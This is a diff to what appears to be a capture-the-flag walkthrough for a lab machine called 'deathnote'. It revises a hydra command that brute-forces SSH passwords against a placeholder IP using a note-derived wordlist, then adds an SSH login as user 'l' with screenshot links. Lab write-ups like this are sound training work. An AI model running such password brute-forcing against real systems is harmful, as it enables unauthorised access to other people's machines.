@@ -110,7 +110,14 @@ http://< IP >/wordpress/wp-admin
 <br>
 
 ```bash
-hydra -l user.txt -P note.txt ssh://< IP >
+hydra -l l -P note.txt ssh://< IP >
 ```
+![deathnote l](https://user-images.githubusercontent.com/112984045/202267251-08e7fc8a-d649-4b2e-bf4b-054135373a6e.png)
+
+```bash
+ssh l@< IP >
+```
+![deathnote ssh l](https://user-images.githubusercontent.com/112984045/202267838-6f78065c-e3b8-486c-a7dc-8975eff5c27e.png)
+
 
  
